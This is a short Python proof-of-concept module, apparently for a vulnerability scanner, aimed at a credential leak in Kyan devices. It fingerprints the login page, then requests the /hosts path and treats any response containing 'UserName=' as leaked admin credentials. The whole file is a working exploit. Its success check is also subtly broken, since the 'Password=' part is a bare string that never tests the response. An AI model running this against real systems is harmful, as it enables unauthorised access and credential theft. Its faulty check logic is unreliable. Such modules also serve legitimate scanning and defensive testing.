from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.high
        self.detail = """<https://blog.csdn.net/qq_35938621/article/details/123976377>"""
        self.name = "Kyan后台密码泄露"

    def check(self):
        client = Http()
        client.url = self.target
        resp = client.get()
        if "login_files/button_login_to_bluesky.png" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        url = urljoin(self.target, "/hosts")
        client = Http()
        client.url = url
        resp = client.get()
        if "UserName=" in resp.text and "Password=":
            return True
        else:
            return False
